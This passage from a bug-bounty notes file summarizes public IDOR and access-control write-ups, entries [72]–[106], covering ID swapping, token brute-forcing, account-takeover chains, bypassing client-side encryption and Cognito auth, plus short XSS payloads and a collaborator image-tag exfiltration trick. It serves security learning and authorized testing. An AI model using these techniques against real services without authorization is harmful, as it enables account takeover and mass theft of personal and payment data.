- Approach/how-found: random `loginToken` → 500. Searched Burp history → `/user/get-finance-user` response contained a numeric `id`; using that `id` as `loginToken` returned his data → Intruder brute-forced `loginToken` (numeric) → all customers' data. (apkleaks/apktool to extract URIs/endpoints/secrets.)
- Test: decompile the mobile app even if you only want the web bug — it reveals hidden endpoints; when a token looks opaque, hunt other endpoints' responses for a value that satisfies it (the "secret" is often a plain `id` returned elsewhere), then brute.
- Q: "What endpoints/params does the APK reveal that the web UI never calls? Is a mysterious token actually a numeric `id` returned by another endpoint I can reuse and brute?"

### [72] `user_id` cookie IDOR on email-change → forgot-password → ATO (mass lockout) — Yaseen Zubair [NEW: cookie-as-identity on a state-changing endpoint]
- Where: a `user_id` cookie (6-digit). Swapping it for page views failed, but the change-email request trusts the cookie.
- Approach/how-found: intercept change-email → set `user_id` cookie to the victim's id + a new nonexistent email (Burp Collaborator address) → success → request forgot-password to that attacker email → reset → ATO. Limitation: victim's user_id unknown, so brute = mass email-change/lockout.
- Test: even if a `user_id` cookie doesn't change what you *see*, test it on *state-changing* requests (change email/phone/password); pair with a controlled email (collaborator/catch-all) + forgot-password for ATO.
- Q: "Does any write endpoint trust a `user_id`/`uid` cookie as identity (vs. the session)? Can I set it to a victim + my email, then reset to take over?"

### [73] Team-delete keyed by member `key`; leak the key via share-profile HPP (`&u=`) → delete any user — rezaduty (Twitter) [NEW: HPP leaks the key a delete-IDOR needs]
- Where: `POST /v1/team/delete` body `{"key":"<memberKey>"}` (403 without a valid key).
- Approach/how-found: swapping `key` deletes that member (403→204), but you need the victim's key. The share-profile feature was vulnerable to parameter pollution — adding `&u=evil.com` leaked the **user key** in the response → delete any user regardless of permission. (Same write-up: HTML injection in a `name` field exfiltrated project/user ids via a collaborator `<img>` in the referer.)
- Test: when a destructive action needs a per-object key, find a share/profile/export endpoint that leaks that key — and try HPP (`&u=`/duplicate params) to make it disclose another user's key. Use `<img src=collaborator>` HTML injection to exfil ids carried in the referer/markup.
- Q: "Does a delete/action need a member/object `key` obtainable via a share/profile endpoint or HPP? Can HTML injection exfil ids through the referer?"

### [74] IDOR in browser sessionStorage `user_id` (trusted client-side identity) — Jerry Shah [NEW: client-storage identity trust]
- Where: balance/account page reads `user_id` from sessionStorage.
- Approach/how-found: DevTools → Application → Session Storage → change `user_id` to the victim's → reload → you're in the victim's account (manipulate funds). Horizontal (sometimes vertical) privesc. Changes are session-scoped (revert on browser close) but impact while live is the same.
- Test: inspect localStorage/sessionStorage/IndexedDB for `user_id`/`role`/`accountId` the app trusts as identity; edit and reload. Combine with cookie/JWT/body id swaps — the app may trust any of these stores.
- Q: "Does the app read identity (`user_id`/`role`) from sessionStorage/localStorage and trust it on reload? What happens if I edit it to a victim's id?"

### [75] "An IDOR often hides many others" — GraphQL `getSaves` with `infoD` = base64-JSON `{"type":"userID","id":"182905"}`; decode→swap id→re-encode reads victim's saved media; one pattern → 10 IDORs in hours — Allam Rachid (zhero_) [DUP-reinforce: base64-JSON object refs + "find one, find many"]
- Where: a private program's GraphQL `"action":"getSaves"` (saved/favorited media); param `infoD` = base64 of `{"type":"userID","id":"<id>"}`.
- Approach/how-found: 2 accounts, drove the victim's private features through Burp, noticed the `infoD` value looked like base64, decoded it and saw it embedded his own `userID`.
- Exploit: changed `id` to the victim's, re-base64'd, swapped into `infoD` → returned all the victim's saved media. Then applied the same "decode the opaque param" lens across the app → 10 IDORs in a few hours (paid for 3, rest dupes).
- Test: decode EVERY opaque param (base64/JSON/hex) to reveal `{type,id}` object refs; once you confirm one IDOR, immediately sweep sibling GraphQL actions/endpoints sharing the same ref pattern — broken authz is usually systemic, not isolated.
- Q: "Is this opaque param a base64/JSON `{type,id}` I can decode, swap, and re-encode? Now that one action is IDOR-able, which other actions reuse the same id pattern?"

### [76] 2FA/OTP step keyed by swappable OTPUserId → unauth mass ATO + no-role admin dashboard — z-sec [NEW: IDOR in auth flow]
- Where: post-login OTP request `OTPUserId=<5 digits>&LoginOTP=...`.
- Approach/how-found: 2FA enabled only for admins; after admin login the OTP step's request identified the user by a client-supplied `OTPUserId`. Swapping it logged into another account, and `LoginOTP` wasn't even validated. The same request sat in the JS, so it worked fully unauthenticated → log in as anyone by id. Then `/admin/dashboard` loaded for any authenticated user (no role check) → User Management → create an admin.
- Test: inspect the 2FA/OTP/step-up request for a user-id param; swap it; try blank/invalid OTP; then direct-browse admin routes as a normal user.
- Q: "Does the 2FA/OTP/step-up step identify the user by a client-supplied id I can swap, and is the OTP value actually checked? Does /admin load without a role check?"

### [77] TikTok Now — `aweme_id` IDOR flips ANY private "memory" Friends→Everyone via `POST /unification/privacy/item/modify/visibility/v1`; the "non-guessable" id is leaked in the profile-view response — Amit Elbirt ($5,500) [NEW ★ action-IDOR on a privacy toggle + the "private" id leaks despite a "become friends to view" block]
- Where: TikTok Now (new app = new scope) privacy-modify endpoint, body `aweme_id=<id>&type=1`.
- Approach/how-found: he first spent an hour just learning the app's features (no tools), picked "view others' private memories" as the highest-impact goal, then captured his own Friends→Everyone toggle. Swapping `aweme_id` to a victim's memory returned 200 and made it public. The id seemed unguessable, but browsing the victim's profile, the API response **exposed the private memory's `aweme_id`** even while the UI said "you can view after you become friends" → unguessable becomes guessable.
- Test: privacy/visibility toggles are write-IDOR targets (flip victim's object to public). When an id seems unguessable, re-read every adjacent response (profile view, list, search) — the "private" id is often leaked there. New apps/scopes added to a known program are prime, under-tested ground.
- Q: "Can I flip another user's object to public by swapping the id in a visibility-change call? Does some 'access denied' view still leak the very id I need in its response body?"

### [78] chatId IDOR + derive chatId from a leaked `messageId` via fixed byte offset → read all chats — Abhisek R ($900) [NEW ★ break the id↔id relationship; sibling endpoint leaks the related id]
- Where: `POST /get-messages` body `chatId` (anti-CSRF header present → not CSRF, but IDOR-able).
- Approach/how-found: a dummy account's `chatId` swapped in → info disclosure (IDOR confirmed). Couldn't enumerate `chatId` directly. Found a `messageId` param + an endpoint leaking `messageId`s for many users; the `messageId`↔`chatId` relationship was a **fixed byte increment** → compute every chatId from leaked messageIds → read all users' private messages.
- Test: when the target id is unguessable, find a related id you *can* leak/enumerate (messageId/orderId/eventId) and test for a deterministic relationship (fixed offset/transform) to derive the target id. Note every id+endpoint as a lead.
- Q: "Is there a related id I can leak from a sibling endpoint, and is it a fixed transform away from the id I actually need?"

### [79] $0 (gov) 100M+ PII: printApplication?id= decrement + DB tar in public upload dir — Jason Haddix [NEW reinforcement]
- Where: VISA/passport gov portal; "Export to PDF" → `printApplication?id=105608983`.
- Approach: decrement the id → another applicant's full PII. Then found a DB **backup .tar in the same directory user images upload to** — no authz, contained credit cards. "Always check /backup or for backup zip/tar files."
- Q: "Does the print/export PDF endpoint use a sequential id? Is there a backup .tar/.zip in the uploads/public dir?"

### [80] Defeat client-side E2E encryption to reach IDOR + SSRF (decompile APK for an unobfuscated twin; breakpoint `encrypt()`; DevTools Overrides proxy) — Asem Eleraky [NEW ★★ encryption-bypass methodology]
- Where: app encrypts every request body (`{v,iv,keys,cipher}`, with `v="pef2"` fixed); real params are hidden.
- Approach/how-found:
  1. encryption is client-side → it lives in the JS. The web JS was obfuscated, so he decompiled the **Android app** (apktool) → `index.android.bundle` was NOT obfuscated and contained `pef2` inside an `encrypt()` function → harvested symbol names (`getBytesSync`, `RSA-OAEP`, `encrypt`).
  2. searched those names in the web JS → set a **breakpoint on `encrypt()`** → read its argument = the plaintext body → `/v1/user` with `domain`+`user` → swap `user` = IDOR (read/edit any user's email/phone); the `url` field = SSRF (point to collaborator).
  3. generalized: with no APK, use **Event Listener Breakpoints → click** and step-over to find the body-builder; to test at scale, use **DevTools Overrides** to replace the JS with an edited copy that pipes the body through a local PHP proxy (`editBeforeSend()`), so you can edit cleartext in Burp *before* it's encrypted.
- Test: encrypted/opaque request bodies are not a wall — the encryptor is in the client. Find an unobfuscated twin (Android `index.android.bundle`, source maps, archived JS), breakpoint the encrypt function to read/modify plaintext, or override the JS to insert a proxy hook; then run normal IDOR/SSRF on the decrypted params.
- Q: "Where is the client-side encrypt function (web JS / Android bundle / source map)? Can I breakpoint it or override the file to edit the plaintext body before encryption, then swap ids / aim `url` fields at a collaborator?"

### [81] Web-encrypted id is plaintext-numeric on the iOS API → private-video IDOR; + GraphQL `user(id)` 10M-PII with ids leaked in reward/image URLs — dhakal_bibek [NEW ★ mobile API exposes enumerable ids; manual GraphQL]
- Where: (a) `GET /api/.../creds?vsid=<id>` — `vsid` is encrypted/random on the web app but **numerical on the iOS API** → swap to a victim's vsid → private-video info. (b) `POST /?p=graphql` `query{user(id:"..."){id,email,firstName,phoneNumber}}` → 10M users' PII.
- Approach/how-found: used the iOS app (Crane to run multiple app containers) to hit the mobile API and found the same object id is plaintext there; for the GraphQL bug, introspection/interception was "disabled" so he hand-crafted the query, and harvested `userID`s from GET params (`DecryptRewardsCode`), public-profile image URLs, and network traffic. Whole write-up's theme: iOS/Android apps have far fewer hunters and routinely expose plaintext/numeric ids the web encrypts.
- Test: when the web uses an encrypted/opaque id, replay the same call from the **mobile API** — it often returns/accepts the plaintext numeric id (enumerable). Craft GraphQL `user(id)` manually even when introspection is blocked; harvest ids from reward codes, image URLs, and public-profile assets.
- Q: "Does the mobile/iOS API expose a plaintext/numeric version of the id the web encrypts? Can I read PII via a hand-crafted `user(id)` query, and where do userIDs leak (reward codes, image URLs, traffic)?"

### [82] Meta Quest: force any Oculus user to follow you by swapping follow_requester_id — vulnano [NEW: actor-id swap in accept]
- Where: `OCAccountFollowRequestButtonsAcceptMutation` (accept-follow GraphQL), param `follow_requester_id`.
- Approach: the accept-follow-request mutation took the *requester's* id as a param; swap it to any Oculus id → that user now follows you with no approval (manufacture fake real-follower accounts).
- Q: "In an accept/approve/confirm request, can I swap the *other* party's id to force them into the relationship/action?"

### [83] $11,250 FB: delete any video via reframe/crop params + DELAYED effect — Bassem Bazzoun [NEW: destruction-by-corruption]
- Where: Meta business suite Reel crop/trim → GraphQL `doc_id:8426940007331645`, `videoID` + `reframeAspectRatios`.
- Approach/how-found: persistence — tested trim (failed) and crop on others' videos. The reframe request accepted **any videoID**; setting an extreme aspect ratio (denominator 11/numerator 1, i.e. 1×N) made the reframe library output a broken/unloadable video = effective deletion of anyone's video/reel/live. Crucial: the effect was **delayed ~5 min**, which is why he missed it on day 1 — he rechecked the next day and saw a test video gone.
- Test: an edit/transform/crop/convert endpoint with no owner check + extreme parameters can corrupt others' content; re-verify later because effects can be async.
- Q: "Does an edit/crop/transform endpoint accept another user's object id? Can extreme params corrupt/destroy it? Is the effect delayed (recheck after minutes)?"

### [84] Zero-click ATO — profile-update IDOR stores XSS on the victim, then harvest CakePHP `_Token`s to change password (old password not required) — M7arm4n (Bugcrowd) [NEW ★ IDOR-stored XSS on victim + per-request CSRF-token harvest]
- Where: `POST /users/update_my_profile` with `data[User][id]` (IDOR) and `data[User][photo]` (reflected into an `<img src>`).
- Approach/how-found: swap `data[User][id]` → edit any user's profile (IDOR). `data[User][photo]` is reflected in `img src`; couldn't close the `<img>` tag but used `onerror` → stored XSS on the victim's profile. The app uses CakePHP CSRF tokens `data[_Token][key]` (stable) + `data[_Token][fields]` (per-function) and the password change ignores the old password. The payload (base64 in the `img id`, run via `onerror=eval(atob(this.id))`) GETs the page to scrape fresh `_Token` values then POSTs a password change → zero-click ATO. Found on a freshly acquired domain (Crunchbase/dorks to map acquisitions).
- Test: an IDOR that writes a *reflected* field into the victim's page = stored XSS on the victim (zero-click). To beat per-request CSRF tokens, have the XSS fetch the form first to scrape current tokens, then submit. Always check whether password change requires the old password.
- Q: "Can an IDOR write a reflected field onto the victim's page (stored XSS on them)? Can my payload scrape per-request CSRF tokens then change the password without the old one? Did I check newly acquired/fresh domains?"

### [85] GraphQL credit-card IDOR — harvest the 12-char `id` from follower/following lists (auto-followed executives) → brute thousands — Vipul Sahu [NEW ★ social list endpoints leak the unguessable id]
- Where: GraphQL `…(id)` returns PII incl. credit-card; `id` is a 12-char string (unbruteforceable). Used the GraphQL Raider Burp extension to expose `id` as an insertion point.
- Approach/how-found: confirmed IDOR with two accounts. To source ids: a follower/following list query returns each user's `id` + profile pic. New users auto-follow company executives, and the executives' follower lists (one had ~1M followers) leak ids en masse → collect ids (bash) → Intruder brute the PII query (no rate limit) → thousands of users' card data.
- Test: when the id is unguessable, scrape it from social-graph endpoints (followers/following/likes/members) — especially high-degree accounts (execs, official pages) you auto-follow on signup. Use GraphQL Raider/InQL to find the id insertion point.
- Q: "Do follower/following/members/likes endpoints return other users' ids? Is there a high-degree account (auto-followed exec/official page) whose list seeds mass id harvesting for the PII query?"

### [86] SSO leaks 15k doctors' password hashes — `admin.js` reveals `/api/v1/user/admin`, swap to `/api/v1/user/<id>` (unauth IDOR) — Jonathan Bouman [NEW ★ JS reveals user endpoint + unauth id-swap leaks hashes]
- Where: `hawebsso.nl` SSO; the login page loaded `admin.js` referencing `GET /api/v1/user/admin`.
- Approach/how-found: read the login page source → `admin.js` exposed an admin role endpoint. Hitting `/api/v1/user/admin` returned *his own* full record incl. password hash; swapping `admin`→a numeric id (`/api/v1/user/15000`) returned any enrolled user's details + hash → IDOR over 15k GPs. Worse, it needed **no authentication** (works in incognito) = Missing Auth. Recon: OpenID `.well-known` for scopes, response headers (IIS), Assetnote wordlists (which include `/api/v1/user/<id>`), LinkFinder for JS endpoints. (Hashes were ASP.NET Identity PBKDF2 → not cracked.)
- Test: read every JS file (esp. `admin*.js`) for privileged endpoints; a generic `/api/v1/user/<id>` is wordlist-discoverable — test it authed AND unauthenticated; check OpenID `.well-known` for scopes/claims.
- Q: "Does a JS file name a user/admin endpoint? Does `/api/v1/user/<id>` return other users' data — and does it even require auth?"

### [87] Fintech reward abuse — video-% spoof + questionnaire response leaks the correct answer + brute non-existent tutorial ids still award coins — 0x4KD [NEW: reward/BOLA logic + answer-in-response + missing existence check]
- Where: learn-to-earn coins; a request reports video watch %, then a questionnaire (with answers) is fetched, then answers submitted for coins.
- Approach/how-found: set watch % to 100 → questionnaire unlocked without watching; the questionnaire fetch response **included the correct answer** → submit it → coins. Automated by brute-forcing tutorial ids 1..10000 — even non-existent ids (`99999999`) awarded coins; no throttling (1000 concurrent) → ~1,000,000 coins.
- Test: for reward/earn flows, check if the server returns the correct answer/secret, if progress is client-asserted (watch %), and whether actions on non-existent/arbitrary object ids still grant value; hammer for missing rate limits.
- Q: "Does the response leak the correct answer/secret? Is completion client-asserted? Do rewards trigger for arbitrary or non-existent object ids, with no throttle?"

### [89] Forced browsing — private team members via a URL whose "unique key" isn't validated; the real selector is a 4-digit team id — MRD7 [NEW: unvalidated long token + short enumerable id]
- Where: team URL `…/<4-digit-team_id>/<unique-long-key>` (403 on direct id access).
- Approach/how-found: no IDOR in request params, but browsing his own team links he found a URL pairing a 4-digit `team_id` with a long key that looks like an auth token. The long key had **no validation** — keep your own key, swap in the victim's 4-digit team id (brute-forceable) → all members of any private team disclosed. No proxy needed, just URL observation.
- Test: when a URL pairs a short id with a long "token", test whether the token is actually validated — often only the short id selects the object, so your own token + the victim's id works. Brute short numeric ids.
- Q: "Is the long key/token in this URL actually validated, or is the short id the real selector? Does my own token + the victim's id return their data?"

### [90] BAC/IDOR — swap ANY user's default payment method: `PUT /api/v1/users/<victimUserId>/default_payment_method/<cardId>` accepted with attacker's `X-Api-Token`; app validates the token's existence, not that it owns the user — Joy Ahmed/xcoder074 ($350) [DUP-reinforce: token authenticates "a user", not "this user"; cookie not even required]
- Where: `PUT /api/v1/users/{userId}/default_payment_method/{cardId}` with header `X-Api-Token` (web app where adding 2 cards unlocks a "swap default" action).
- Approach/how-found: methodically created 2 accounts, mapped the payments flow (no CC of his own → borrowed his father's card to populate the feature). Noticed card id sequential + the app authorizes purely on `X-Api-Token` (deleting cookies still worked). Added 2 cards to expose the "swap default" call, then replayed it with **user2's token** against **user1's** `userId`/`cardId` → swapped a stranger's default payment. No rate limit → Intruder over ids.
- Test: when an app authorizes via a header token, test whether that token gates only "logged in" vs "owns this object" — keep your token, target another user's id in the path/body. Also: features that need ≥2 objects (swap/merge/compare) only appear after you create them.
- Q: "Is the API token bound to the user id in the path, or just proof of any valid session? Can I drive a 'swap/set-default' action against another user's id with my own token?"

### [91] HackerResume — chain: leak `uid` via shared-resume hex → `/api/token` mints a token for ANY uid → board CRUD IDORs (board_id/stage_id) — Swapmaurya [NEW ★ token endpoint accepts arbitrary uid = auth bypass]
- Where: ATS/resume app; `uid` is the access key (hard to leak).
- Approach/how-found: (1) put the victim's hex (from their public-resume share URL) into `PUT /api/user/<attacker_id>/resumes/<victim_hex>` → the response **dumps the victim's `uid`**. (2) `POST /api/token {"uid":"<victim>"}` returns a valid bearer for that uid — the token endpoint mints tokens for *any* uid (auth bypass) → access the victim's ATS board (brute the numeric board number). (3) Board CRUD IDORs: move a job into the victim board via `stage_id`; add a stage via `board_id` (server ignores `user_id`/`user_email` in body); delete any stage via numeric `stage_id` (brute).
- Test: if a `/token`/session endpoint accepts a `uid`/`email` in the body, try a victim's value — it may mint their token. Public share links carry a hex you can convert to the internal id. After access, every `board_id`/`stage_id`/`task_id` is a CRUD-IDOR candidate; ignored `user_id`/`user_email` body fields confirm no server check.
- Q: "Does a token/session endpoint mint a token from a `uid`/`email` I supply? Does a public share link expose a hex convertible to the internal id? Are `board_id`/`stage_id` actions checked against my ownership?"

### [92] rez0 'hacking on a plane': test the unguessable swap anyway, pivot lookup key, reset→ATO — rez0 [NEW reinforcement: pivot the key]
- Where: wifi provider; `GET /edge/apidecorator/v3/customer?...&user_name=<timestamped>`.
- Approach/how-found: `user_name` looked unguessable (timestamp) so most would skip — he tested the swap anyway → worked. Then pivoted the lookup key to fields visible in the response: `email_address` (targeted) → worked; `customer_id` (integer) → enumerate ALL (tens of millions). Separately the reset flow's `PUT /customer` had `"user":"<username>"` in the body — swap to victim → full ATO (verified on Sam Curry's account).
- Test: always try the "unguessable" swap; then change the lookup parameter to the most enumerable field present in the response (email → integer id); check the reset endpoint for a swappable user field.
- Q: "Even if the id looks unguessable, does the swap work? Can I switch the lookup key to an integer/email in the response to widen impact? Does the reset endpoint take a user field I can swap?"

### [93] Google Chat — removed space CREATOR can still read members: `batchexecute` member-list RPC keyed on space ID only; swap your old space ID for the victim's → names+emails — hoangkien/hope ($1337) [NEW: removed-privileged-user retains read access via direct RPC]
- Where: `POST /u/0/_/DynamiteWebUi/data/batchexecute?rpcids=` (EmdhDb/vWUt9 member-list RPCs); key = `space/<spaceID>`.
- Approach/how-found: when a Space *creator* is removed by another manager they lose UI access, but the underlying member-list `batchexecute` RPC only checks the space ID, not current membership. Intercept "View Members", swap the attacker's space ID for the target space ID (one the attacker used to belong to) — no need to change the user ID — 200 + members' names/emails in response.
- Test: after you're removed/downgraded from a resource, REPLAY the old data-fetch RPC directly — revocation often only hides the UI, not the API. Batched RPC endpoints (Google `batchexecute`) carry the object id inside `f.req`.
- Q: "After my access is revoked, can I still hit the underlying fetch RPC by id? Does the server re-check *current* membership, or only that the id is well-formed?"

### [94] IoT picture frame: sequential device_token + unauth device endpoints + unauth AcceptBind — scrawledsecurity [NEW: unauth IoT lifecycle endpoints]
- Where: Ourphoto app / frame backend.
- Approach/how-found: mobile user_id decrement failed, but `POST /device/signin` took a **sequential `device_token`** and was **unauthenticated** → enumerate every frame's info, bound users' ids, and cleartext creds. `POST /device/AcceptBind` needed only user_id+device_id (both leaked) and was unauth → bind to ANY frame without the physical "Accept" → push photos. Email-to-frame ignored the device_token subject check → spoof an authorized sender. Root cause of the original mystery found via the "Feedback → share app log" feature leaking sender_id.
- Test: for IoT, capture frame↔cloud traffic separately from app↔cloud; the device/bind/signin lifecycle endpoints are often unauthenticated and keyed by sequential device ids; app log/feedback features leak ids.
- Q: "Are the device signin/bind/accept endpoints authenticated, and is device_token sequential? Does a feedback/log-upload feature leak other users' ids?"

### [95] Banking Xamarin app — ILSpy-decompile the .dll, re-sign requests (HMAC + hardcoded ClientSecret), then IDOR by account number + create-OTP leaks creds from a phone number — protostar0 [NEW ★ Xamarin .dll reverse + re-sign + account-number IDOR]
- Where: rooted device + Frida (SSL unpinning); requests carry an `ONB-CS` integrity signature.
- Approach/how-found: JADX showed nothing (Xamarin app → logic in `Resources/assemblies/*.dll`). ILSpy decompiled the DLLs → `ONB-CS` = `HMACSHA256(body, *BankClientSecret)` with the secret **hardcoded** (also leaked internal-platform access). Re-implemented signing in Python (Proxychains→Burp to observe). `GetAccountFullInfo` takes only an **account number** (IDOR), and `CreateOTP` returns hashed password/pin + account number given just a **phone number** → got an employee's phone from LinkedIn → pulled his account number → `GetAccountFullInfo`/`GetStatement`/`SendMoney` all IDOR by account number → full compromise from a phone number. The signature was the *only* backend check.
- Test: for Xamarin/.NET apps, reverse `assemblies/*.dll` with ILSpy (not JADX); find the request-signing routine + any hardcoded secret, re-sign in your own script, then test every account-number/phone-keyed API for IDOR and credential leaks (create-OTP/login responses).
- Q: "Is the request signature computed client-side with a hardcoded secret I can extract (ILSpy for Xamarin)? Are APIs keyed by account number/phone with no session binding? Does create-OTP/login leak hashes or account numbers?"

### [96] Synack weekend — Match&Replace + AutoRepeater to surface SQLi/XSS/IDOR fast; read-only IDOR by id swap — Manas Harsh ($8k/5 bugs) [DUP — tooling/automation]
- Where: multiple endpoints on one program.
- Approach/how-found: used Burp **Match & Replace** (auto-mutate a param value like `test`→`test'` across all traffic) to catch error-based SQLi, and **AutoRepeater** (auto id-swap + match/replace) to catch read-only IDORs (other users' data by changing ids). Classic `'><input autofocus onfocus=alert(1)>` for stored XSS.
- Test: configure Match & Replace / AutoRepeater to auto-swap ids and inject quotes across your whole session so IDOR/SQLi surface passively while you browse; write thorough reports (video PoC, every step).
- Q: "Have I set up AutoRepeater/Match&Replace to auto-swap ids site-wide so IDORs surface while I browse normally?"

### [97] Gov e-learning — registration "already registered" response leaks victim userid/PII → reset-by-userid (no old password) → ATO — iamgk808 [NEW ★ register-error PII leak + reset-by-id from a valid session]
- Where: teacher portal; register requires a school "UDISE code".
- Approach/how-found: login/reset failed (wrong creds). Entering the correct UDISE code on **register** returned "Another teacher already registered" but the *response body leaked the existing user's email, mobile, and user id*. With a separate valid login (his father's), he found a password-reset request needing only a valid **user id** with no old-password check → reset the victim's password using the leaked id → ATO. Also IDOR to view any teacher's/student's PII by changing the id.
- Test: registration/"already exists" flows often leak the existing account's PII/userid in the response — harvest it; then use any authenticated reset/change endpoint keyed by user id (no old-password check) against that id.
- Q: "Does a register/'already exists' response leak the existing user's id/email/phone? Is there a reset/change-password keyed by user id with no old-password check I can invoke from my own session?"

### [98] Yii profile — per-field user ids (about-section IDOR) + HTML injection in `content` + unenforced CSRF token → mass phishing ATO — SYRINE [NEW: many distinct id params; test each]
- Where: profile edit sends multiple objects each with its OWN `id` (username, name, about, photo all different) + `YII_CSRF_TOKEN`.
- Approach/how-found: tested each id separately — the about-section `id` is IDOR-able → edit anyone's about section. `content` accepts HTML → HTML injection (not XSS) → embed a "re-login here" phishing link. The `YII_CSRF_TOKEN` isn't validated (and earlier, removing the `YII_CSRF_TOKEN` cookie bypassed reset rate-limiting) → flood requests → mass-change every user's about section to a phishing link → ATO at scale.
- Test: when one form sends several objects each with its own id, test every id independently (one may be unprotected). HTML-injectable text fields enable phishing even without XSS. If the CSRF token isn't actually enforced, you can mass-automate the IDOR.
- Q: "Does the form carry multiple distinct ids — is any one unprotected? Does a text field render injected HTML? Is the CSRF token actually validated, or can I mass-replay?"

### [99] IDOR→ATO via path-traversal on the id segment (`/addEmail/<demoId>/../<victimId>/`) — Jefferson Gonzales ($2,500) [NEW ★ `/../` defeats the authz-checked id segment]
- Where: `POST /<orgID>/addEmail/<DemoUserID>/` body `{"email":"attacker@..."}` (assigns an email to a "Demo user").
- Approach/how-found: changing `DemoUserID` to a real member's `UserID` → 403. Bypass: `POST /<orgID>/addEmail/<DemoUserID>/../<UserID>/` — the authz check validates the first (your demo) id, but path normalization resolves `/../<UserID>/` to the victim → sets the victim's email to attacker-controlled → reset → ATO.
- Test: when an id segment in the path is access-checked, append `/../<victimId>/` (or other normalization tricks) so the check sees your allowed id but the router resolves to the victim's. Demo/placeholder users you can create are great pivots for write endpoints.
- Q: "Does authz check the literal path id while the router normalizes `/../`? Can I prefix my allowed id then traverse to the victim's id on a state-changing endpoint?"

### [100] "Bidirectional/stored IDOR" — blank a field + swap `_id` → the save endpoint backfills your blank from the victim's record (read) and can write to theirs — Hassan Farooq [NEW: blank-field save reflects victim data]
- Where: bank profile update; many params incl. `_id`.
- Approach/how-found: normal id-swap found nothing. Then he cleared the last-name field, saved, intercepted, and changed `_id` (1211221→1211220) → his last name auto-filled with the **victim's** name. So a blanked field + swapped id makes the update return/store the target's value → read other users' data by blanking fields, and also write data into their profiles (and store XSS). Other endpoints leaked CC data.
- Test: on update/save endpoints, try *blanking* fields then swapping the id — some "upsert" flows backfill empty fields from the referenced record (read primitive) or save your data onto it (write primitive). Test both directions.
- Q: "If I blank a field and swap the id on save, does the response backfill the victim's value (read) or write mine onto their record (write)?"

### [101] Google/AppSheet — send/spam docs into a victim's Google Docs via id swap; id via Google search; `version` irrelevant — Caesar Evan (Google VRP) [DUP reinforcement: action-on-victim by id + OSINT id]
- Where: AppSheet "send template to Google Docs" request carrying an `ID` (+ a `version`).
- Approach/how-found: two accounts; Intruder-swap attacker `ID`→victim `ID` → the doc is created in the **victim's** Google Docs (spam/write). The victim's id is discoverable via Google search; the `version` need not match the victim's.
- Test: action endpoints (send/share/export to a third-party store) keyed by an id let you write into a victim's space — swap the id; harvest ids via Google/OSINT; ignore "version"/secondary params that aren't validated.
- Q: "Does a send/share/export action take an id I can swap to write into the victim's account/store? Can I find that id via Google/OSINT?"

### [102] Time-object IDOR — bypass deadline/immutability by tampering the time param (app checks time, not the id↔time binding) — nxenon [NEW ★ time-parameter IDOR class]
- Where: any request carrying a time/date param alongside object ids (schedules, deadlines, editable windows).
- Approach/insight: devs often accept a time from the client for repeated/timeline items; the backend validates the *time* (is the window open?) but doesn't verify the supplied IDs actually belong to that time → set the time to a future/open date and edit or add items that should be locked (past deadline). "Time objects" are an IDOR blinker.
- Test: when a request has a time/date param, change it to an open window (future/now) while keeping a locked object's id — if the edit succeeds, the app gates on time but not on the id↔time relationship.
- Q: "Does this action gate on a client-supplied time? If I move the time into the allowed window, can I still act on a past/locked object's id?"

### [103] Unsubscribe IDOR — base64-JSON `{user_id}` in the link; token after `%3D` not bound to the body → unsubscribe anyone — shbugger1 ($200) [DUP reinforcement: base64-JSON ref + unvalidated token]
- Where: email unsubscribe link = `base64(JSON{"user_id":...,"preference":...})%3D` + a separate token.
- Approach/how-found: decoded the base64 JSON, changed `user_id`, re-encoded → unsubscribe any user; the trailing token wasn't validated against the modified body.
- Test: decode every base64/JWT-ish blob in emails/links; if it contains a `user_id`/`preference`, swap and re-encode — and check whether an accompanying token is actually bound to the payload.
- Q: "Is the unsubscribe blob base64-JSON with a `user_id` I can swap, and is the accompanying token bound to the payload or ignored?"

### [104] Base64-encoded numeric id + hidden client-side PII — Graham Zemel ($750+) [DUP reinforcement: decode-decrement-reencode + read full response]
- Where: `?id=MjQzNDU%3D` = URL-encoded base64 of `24345`.
- Approach/how-found: URL-decode → base64-decode → `24345`; decrement to `24344`, re-encode (`MjQzNDQ%3D`) → another user's record. The rendered HTML showed only a name, but the **page source/client-side data** held full PII (name, email, phone, DOB). 20-line parser to automate.
- Test: `%`-containing ids are encoded — URL+base64 decode, change the number, re-encode. Always read the full response/page source, not just rendered text — apps hydrate client-side state with far more PII than they display.
- Q: "Is the id base64-of-a-number I can decrement and re-encode? Does the raw response/page source contain PII beyond what's rendered?"

### [105] Google Data Studio — read-blocked report cloned via `/persistTempReport` `sourceReportId` (copy endpoint skips the check `/getReport` enforces) — Caesar Evan (Google VRP $3,133.70) [NEW ★ copy/persist sibling skips authz]
- Where: Data Studio (Looker); `/persistTempReport` body `sourceReportId` (a report/template id).
- Approach/how-found: swapping `sourceReportId` to a 2nd account's report id on `/persistTempReport` worked — it persisted/cloned the victim's report into his space. The canonical read `/getReport` with the same swapped id returned `PERMISSION_DENIED` (authz enforced there), but the copy/persist endpoint had no check → access protected reports by *cloning* them.
- Test: when the obvious read endpoint enforces authz, look for a sibling that *copies/persists/duplicates/imports/exports* the same object by id (`sourceXId`, `copyFrom`, `importId`) — these mutation paths frequently skip the read-side authz, letting you clone the protected object into your account.
- Q: "Does a copy/duplicate/persist/import endpoint accept the same `source*Id` that the read endpoint protects? Can I clone a victim's object into my space to bypass the read check?"

### [106] Amazon Cognito custom-auth ATO — victim session+username + ATTACKER IdToken passes (IdToken not bound to session) — Hossam Ahmed [NEW ★ Cognito CUSTOM_AUTH IDOR]
- Where: `cognito-idp.<region>.amazonaws.com` CUSTOM_AUTH flow; `InitiateAuth` → `RespondToAuthChallenge`.
- Approach/how-found: the app links Google OAuth then verifies via a Cognito custom challenge where `ANSWER` = the user's IdToken. `RespondToAuthChallenge` validates (1) the session is bound to the username and (2) the IdToken is valid — but NOT that the IdToken belongs to that session/username. Exploit: `InitiateAuth {AuthFlow:CUSTOM_AUTH, USERNAME: victim_email}` → returns the **victim's session**; then `RespondToAuthChallenge {USERNAME: victim, Session: victim_session, ANSWER: attacker_valid_IdToken}` → returns the **victim's** Access/Id/Refresh tokens → full ATO with only the victim's email.
- Test: on Cognito CUSTOM_AUTH, fetch a victim's session via `InitiateAuth` (username=email), then answer the challenge with YOUR valid IdToken — if tokens come back, the token isn't bound to the session/username (broken Lambda triggers). General rule: whenever auth combines session + token + identifier, test every cross-combination (victim session + your token + victim username).
- Q: "In a multi-step/custom auth (Cognito CUSTOM_AUTH), is the answer token bound to the session+username, or can I mix a victim's session/username with my own valid token to mint their tokens?"

